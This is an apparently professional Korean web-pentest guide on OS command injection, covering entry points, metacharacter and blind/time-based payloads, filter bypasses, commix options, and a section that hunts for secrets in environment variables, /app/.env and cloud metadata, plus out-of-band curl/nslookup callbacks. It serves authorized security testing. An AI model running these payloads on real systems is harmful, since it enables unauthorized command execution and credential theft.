---
sidebar_position: 12
title: OS Command Injection
description: 웹 진단 - OS Command Injection 컨텍스트 판단, 메타문자, Blind/OOB 확인, 우회 노트
keywords: [Command Injection, OS Command, RCE, Blind, OOB, 입력값 검증, OWASP A05]
draft: false
---

# 운영체제 명령어 삽입 (OS Command Injection)

## 점검 목적

사용자 입력값이 OS Command 실행 함수나 외부 바이너리 인자에 안전하게 분리되지 않은 채 들어가는지 확인. 성공 시 서버 권한으로 명령 실행, 파일 접근, 내부 시스템 접근, 서비스 장애 유발이 가능함. 운영 환경에서는 `echo` 마커, 사용자/호스트 확인, 짧은 지연 payload처럼 영향이 낮은 증거부터 확인.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **In-band** | 명령 실행 결과가 응답/로그에 직접 노출 | `echo`, `whoami`, `hostname` 결과가 응답에 섞이는지 확인 |
| **Blind Time-based** | 응답 내용은 같고 실행 여부를 시간으로만 판단 | baseline 대비 지연이 반복적으로 재현되는지 확인 |
| **Out-of-Band (OOB)** | DNS/HTTP 콜백으로 실행 여부 확인 | 사전 승인된 Collaborator/interactsh에서 마커 콜백 수신 여부 확인 |
| **Argument Injection** | 셸 메타문자는 안 먹지만 입력값이 외부 명령 옵션으로 해석 | `--help`, `--version` 같은 안전한 옵션 반영 여부 확인 |

### OS별 메타문자

| 환경 | 먼저 볼 문자 | 실무 판단 |
| :--- | :--- | :--- |
| Linux/Unix shell | `;`, `&&`, `\|`, `$()`, backtick, `%0a` | `sh -c`, `bash -c`로 문자열이 붙는지 확인 |
| Windows cmd | `&`, `&&`, `\|` | `;`는 보통 동작하지 않음 |
| PowerShell | `;`, `&`, `\|` | PowerShell 호출 여부가 보일 때만 확인 |
| 셸 미사용 실행 | 메타문자보다 옵션값 | `Runtime.exec([...])`, `subprocess.run([...])` 형태면 Argument Injection을 봄 |

---

## 진단 절차

### Step 1. 진입점 식별

단순 파라미터 fuzz보다 OS 명령 호출 가능성이 높은 기능을 먼저 본다.

- 네트워크 진단: ping, traceroute, nslookup, whois, curl 테스트
- 파일 변환/처리: 이미지 리사이즈, PDF 변환, Office 변환, 동영상 트랜스코딩
- 압축/해제: ZIP/TAR 업로드 후 자동 해제, 백업 생성
- 외부 URL fetch: URL 미리보기, webhook 테스트, 원격 파일 다운로드
- 파일명/메타데이터: 업로드 파일명, 압축 내부 파일명, EXIF/문서 메타데이터
- 관리자 도구: 로그 조회, 백업, 배치 실행, 서버 상태 진단

### Step 2. Command Injection 진단 루틴

Burp Repeater에서 정상 입력을 baseline으로 고정한 뒤, **메타문자 확인 → 출력 확인 → 지연 확인 → 승인된 OOB 확인** 순서로 좁힌다.

**1. 메타문자/명령 분리 확인**

먼저 영향이 낮은 `echo` 마커로 명령이 분리 실행되는지 본다.

```text
127.0.0.1;echo ci_test
127.0.0.1&&echo ci_test
127.0.0.1|echo ci_test
127.0.0.1$(echo ci_test)
127.0.0.1%0aecho ci_test
```

Windows 후보는 `&`를 먼저 본다.

```text
127.0.0.1&echo ci_test
127.0.0.1&&echo ci_test
127.0.0.1|echo ci_test
```

**2. 실행 결과 확인**

마커가 응답에 보이면 OS 식별용 최소 명령으로 전환한다.

```text
;whoami
;hostname
;id
& whoami
& hostname
& ver
```

**3. Time 비교**

출력이 없을 때만 짧은 지연으로 본다.

```text
;sleep 3
&& sleep 3
;ping -c 3 127.0.0.1
& ping -n 4 127.0.0.1
```

**4. OOB 확인**

응답/시간으로 판단이 안 되고 외부 콜백 사용이 승인된 경우에만 본다.

```text
;nslookup ci-<RANDOM>.<COLLAB>.oastify.com
;curl http://ci-<RANDOM>.<COLLAB>.oastify.com
& nslookup ci-<RANDOM>.<COLLAB>.oastify.com
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| 응답에 `ci_test`가 섞임 | In-band 후보 | `whoami`, `hostname`으로 실행 권한 확인 |
| 응답에 `uid=`, 사용자명, 호스트명이 보임 | Command Injection 확정 | 최소 증거 캡처 후 영향 범위 확인 |
| 출력은 없고 지연만 재현됨 | Blind 후보 | baseline/False/True 지연을 반복 비교 |
| Collaborator에 마커 콜백 수신 | OOB 후보 | 요청 시간, source IP, unique marker를 같이 기록 |
| 메타문자는 실패, `--help`는 반영 | Argument Injection 후보 | 호출되는 바이너리와 위험 옵션 여부 확인 |
| 특수문자만 500 발생 | 단순 예외 가능성 | stderr 노출, 필터 차단, 타입 검증 여부 분리 |

### Step 3. 컨텍스트별 빠른 선택

입력값이 어떤 명령 위치에 들어갈지 먼저 가정하고 payload를 고른다.

| 입력 컨텍스트 | 먼저 넣을 값 | 볼 것 |
| :--- | :--- | :--- |
| Ping host: `host=127.0.0.1` | `127.0.0.1;echo ci_test` | ping 결과 뒤에 마커가 붙는지 |
| Windows 진단: `host=127.0.0.1` | `127.0.0.1&echo ci_test` | cmd 계열 연산자가 먹는지 |
| URL fetch: `url=http://...` | `http://example.com;echo ci_test` | URL 검증 전/후 어느 단계에서 막히는지 |
| 파일명 | `test.jpg;echo ci_test` | 변환 로그, 미리보기, 관리자 처리 화면에 출력되는지 |
| 압축 내부 파일명 | `a;echo ci_test.txt` | 압축 해제/검사/변환 과정에서 실행되는지 |
| 옵션 위치 | `--help`, `--version` | 입력값이 명령 옵션으로 해석되는지 |
| 비동기 작업 | `;sleep 3` 또는 승인된 OOB 마커 | 즉시 응답이 아니라 처리 완료 시점 영향 |

### Step 4. OS / Shell 식별

취약 가능성이 보이면 운영 영향이 낮은 명령으로 환경만 식별한다.

| 환경 | 확인 값 | 판단 |
| :--- | :--- | :--- |
| Linux/Unix | `;id`, `;whoami`, `;hostname`, `;uname -s` | 웹서버 사용자, 컨테이너/호스트 단서 확인 |
| Windows cmd | `& whoami`, `& hostname`, `& ver` | IIS AppPool, 서비스 계정, Windows 버전 확인 |
| PowerShell | `; whoami`, `; $PSVersionTable.PSVersion` | PowerShell이 실제 인터프리터인지 확인 |
| 셸 없음 | `--help`, `--version` | 외부 바이너리 옵션으로만 해석되는지 확인 |

### Step 5. 영향 확인

취약 확정에는 인터랙티브 셸이나 대량 파일 조회보다 **최소 증거**가 좋다.

- In-band: `echo ci_test`, `whoami`, `hostname`이 응답에 노출되는지 확인
- Blind: `sleep 0/3` 또는 baseline/지연 payload가 반복적으로 갈리는지 확인
- OOB: unique marker, 요청 시간, 수신 protocol, source IP를 함께 기록
- Argument Injection: 안전한 옵션이 반영되는지와 호출 바이너리 종류를 확인
- 관리자 기능: 관리자 권한이 필요한 기능인지, 일반 사용자도 접근 가능한지 분리

---

## 페이로드 노트

아래 payload는 컨텍스트가 잡혔을 때 사용한다. 운영 환경에서는 짧고 가벼운 명령부터 확인하고, 파일 조회/외부 통신/장시간 지연은 사전 협의 범위에서만 사용한다.

### 메타문자 / 명령 분리

정상 입력 뒤에 명령 구분자를 붙여 셸 문자열로 이어지는지 확인한다.

```text
127.0.0.1;echo ci_test
127.0.0.1&&echo ci_test
127.0.0.1|echo ci_test
127.0.0.1$(echo ci_test)
127.0.0.1%0aecho ci_test
```

Windows는 `;`보다 `&` 계열을 먼저 본다.

```text
127.0.0.1&echo ci_test
127.0.0.1&&echo ci_test
127.0.0.1|echo ci_test
```

`echo ci_test`가 응답, 변환 로그, 관리자 화면에 보이면 명령 분리가 된 것으로 본다.

### In-band 출력 확인

마커가 잡힌 뒤에만 OS 식별용 최소 명령으로 넘어간다.

```text
;whoami
;hostname
;id
;uname -s
& whoami
& hostname
& ver
```

stdout만 노출되고 stderr는 버려지는 경우가 있다. 오류만 의심될 때는 제한적으로 stderr 병합을 확인한다.

```text
;id 2>&1
& whoami 2>&1
```

### Blind Time-based

결과 출력이 없을 때 사용한다. 네트워크 지연과 섞이지 않게 짧게 시작한다.

```text
;sleep 3
&& sleep 3
;sleep 0
;ping -c 3 127.0.0.1
& ping -n 4 127.0.0.1
```

판정은 한 번의 지연이 아니라 **baseline 정상 / False 비지연 / True 지연** 조합이 반복될 때 한다.

### OOB 확인

비동기 처리이거나 출력/지연으로 판단이 어려울 때만 사용한다. 외부 통신 로그가 고객사 보안 장비에 남을 수 있으므로 사전 승인된 도메인만 쓴다.

```text
;nslookup ci-<RANDOM>.<COLLAB>.oastify.com
;curl http://ci-<RANDOM>.<COLLAB>.oastify.com
& nslookup ci-<RANDOM>.<COLLAB>.oastify.com
```

콜백이 오면 payload별 unique marker, 요청 시각, 기능명, source IP를 같이 기록한다. 명령 결과를 외부 도메인에 싣는 방식은 운영 진단에서 기본 사용하지 않는다.

### Argument Injection

셸 메타문자가 안 먹어도 입력값이 외부 명령의 옵션으로 들어가면 별도 취약점이 될 수 있다. 먼저 안전한 옵션이 반영되는지 본다.

```text
--help
--version
-h
-V
```

| 호출 가능성이 있는 도구 | 안전 확인 값 | 볼 것 |
| :--- | :--- | :--- |
| `curl` / `wget` | `--version`, `--help` | 도움말/버전 문자열이 응답이나 로그에 나오는지 |
| ImageMagick | `-version`, `-help` | 변환 결과 대신 도구 출력이 노출되는지 |
| `tar` / `zip` | `--version`, `--help` | 압축 처리 오류가 옵션 기준으로 바뀌는지 |
| `ffmpeg` | `-version`, `-h` | 인코딩 로그에 옵션 출력이 섞이는지 |

안전 옵션이 반영되면 호출 바이너리와 위험 옵션을 따로 분석한다. 바로 실행형 옵션이나 파일 쓰기 옵션으로 넘어가지 않는다.

### 파일명 / 업로드 처리

파일명은 저장 시점보다 변환/미리보기/압축 해제/백신 검사 같은 후처리에서 발현되는 경우가 많다.

```text
test.jpg;echo ci_test
test.jpg&&echo ci_test
test$(echo ci_test).jpg
test%0aecho%20ci_test.jpg
```

확인은 업로드 응답만 보지 말고 썸네일 생성, 상세 보기, 관리자 검수, 다운로드, 변환 로그까지 이어서 본다.

### 필터 우회

필터가 보이면 차단된 문자를 기준으로 좁혀간다.

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| `;` 차단 | `&&`, pipe, newline | `&&echo ci_test`, `%0aecho ci_test` |
| 공백 차단 | `${IFS}`, tab, brace expansion | `echo${IFS}ci_test`, `echo%09ci_test` |
| 명령어 키워드 차단 | quote 분리, 변수 결합 | `w"h"oami`, `a=who;b=ami;$a$b` |
| 괄호 차단 | 단순 구분자 우선 | `;echo ci_test`, `&&echo ci_test` |
| URL 인코딩 이슈 | 한 번/두 번 인코딩 비교 | `%3b`, `%253b`, `%26`, `%0a` |
| 출력 없음 | stderr 병합, time-based | `2>&1`, `sleep 3` |
| Linux payload 실패 | Windows 연산자 확인 | `& whoami`, `& hostname` |
| 메타문자 전부 실패 | Argument Injection 확인 | `--help`, `--version` |

---

## 자동화 도구 참고

실무 운영 점검에서는 고객사 가용성 문제와 요청량/페이로드 변형을 점검자가 세밀하게 통제하기 어려운 이슈 때문에 commix 같은 자동화 도구를 기본 사용하지 않는다. 랩 환경이나 사전 승인된 제한 검증에서 참고하는 정도로만 둔다.

사용하더라도 Burp 요청 파일 기준으로 대상 파라미터와 기법을 좁힌다.

```bash
commix -r request.txt -p host --batch --technique=classic
commix -r request.txt -p host --batch --technique=time
```

아래 옵션은 운영 환경에서는 사용하지 않는 쪽으로 본다.

```bash
--os-shell
--os-pwn
--reverse-tcp
--alter-shell
```

자동화 결과는 최종 판정 근거가 아니라 수동 재현을 돕는 참고 자료로만 본다.

---

## 취약 판정 기준

다음 중 하나라도 안정적으로 재현되면 취약으로 본다.

- [ ] 입력값 뒤에 붙인 `echo ci_test`가 응답, 로그, 관리자 화면에 출력됨
- [ ] `whoami`, `hostname`, `id` 같은 최소 명령 결과가 서버 권한으로 노출됨
- [ ] 지연 payload에서 baseline 대비 일정 시간 이상 지연이 반복 재현됨
- [ ] 승인된 OOB 도메인으로 unique marker 콜백이 수신됨
- [ ] 셸 메타문자는 실패해도 입력값이 외부 바이너리 옵션으로 해석됨

다음은 후보 또는 보류로 둔다.

- [ ] 특수문자 하나로 500 오류만 발생하고 명령 결과/지연/OOB가 없음
- [ ] 응답 지연이 payload와 무관하게 흔들림
- [ ] OOB 콜백이 payload 없이도 발생함
- [ ] 입력값이 URL 검증, JSON 스키마, 파일 확장자 검증에서만 차단됨
- [ ] 클라이언트에서만 검증/변환되고 서버 처리에 영향이 없음

영향도가 올라가는 조건:

- [ ] 일반 사용자 권한으로 관리자 진단 기능 호출 가능
- [ ] 웹서버 계정 권한이 높거나 컨테이너 탈출 단서가 있음
- [ ] 파일 변환/배치/압축 해제처럼 비동기 후처리에서 실행됨
- [ ] 내부망 통신 또는 민감 설정 접근 가능성이 확인됨

---

## 블라인드 모의해킹 확장

취약점 진단에서는 `echo`, `whoami`, 짧은 지연으로 멈추지만, 블라인드 모의해킹에서는 **실행 권한, 시스템 경계, credential 접근, 내부 접근성**까지 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. 실행 권한 | 현재 사용자, 호스트, 작업 경로 | `whoami`, `hostname`, `pwd` |
| 2. 실행 환경 | 컨테이너/VM 여부, 런타임, 환경변수 | 환경변수 key/value, 프로세스/경로 단서 |
| 3. Credential 접근 | 앱 설정 파일, cloud metadata, SSH/API key | 원문 credential 확보 및 사용 가능성 |
| 4. 내부 접근성 | 내부 DNS/HTTP/metadata reachability | status code, 응답 샘플, 인증 성공 여부 |

### 실행 권한 / 환경 확인

명령 실행이 확인되면 먼저 현재 권한과 실행 위치만 본다.

```text
;whoami
;hostname
;pwd
;id
```

환경변수는 key 목록으로 시작하고, credential 후보가 보이면 범위 내에서 원문 값까지 확인한다.

```text
;env | cut -d= -f1 | sort | head
;printenv | cut -d= -f1 | sort | head
;env | grep -Ei 'key|secret|token|password|credential|aws|gcp|azure'
```

Windows 후보는 아래처럼 본다.

```text
& whoami
& hostname
& cd
& set
```

`set`은 값이 함께 출력된다. Windows 환경에서 credential 후보를 빠르게 확인할 때 쓴다.

### 파일 / 컨테이너 경계 확인

파일 내용 전체를 읽기보다 후보를 좁힌 뒤 credential 또는 내부 접속 정보가 있는 파일은 원문 일부를 확인한다.

```text
;test -f /app/.env && echo env_exists
;test -f /etc/passwd && echo passwd_exists
;head -n 1 /etc/hostname
;cat /proc/1/cgroup | head -n 3
;find /app -maxdepth 3 -type f \( -name ".env" -o -name "*config*" -o -name "*secret*" \) 2>/dev/null | head
;sed -n '1,40p' /app/.env 2>/dev/null
```

원문 credential, token, private key가 나오면 사용 가능성 확인까지가 블라인드 모의해킹의 핵심 증거가 될 수 있다. 다만 불필요한 전체 파일 수집보다 필요한 값과 출처, 사용 가능 여부를 중심으로 남긴다.

### 내부 접근성 확인

내부망 영향은 reachability에서 시작하고, 접근 가능한 서비스가 확인되면 인증 여부와 제한된 응답 샘플까지 본다.

```text
;getent hosts internal.example.local
;curl -m 3 -s -o /dev/null -w "%{http_code}" http://internal.example.local/
;curl -m 3 -s -o /dev/null -w "%{http_code}" http://169.254.169.254/
;curl -m 3 -s http://internal.example.local/ | head
```

클라우드 metadata는 role name, token 발급 가능 여부, 임시 credential 사용 가능성까지 확인한다.

### Controlled Shell 확인

명령 실행이 안정적이고 outbound 연결이 가능하면 controlled shell로 조작 가능 범위를 확인한다.

```text
;which bash nc python3 perl php
;bash -c 'echo shell_ready'
;python3 -c 'import os;print(os.getuid())'
```

셸 획득 후에는 현재 사용자 권한, 파일 접근, 내부망 접근, credential 사용 가능성을 확인한다.

---

## 참고자료

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [commix 공식 문서](https://github.com/commixproject/commix/wiki)
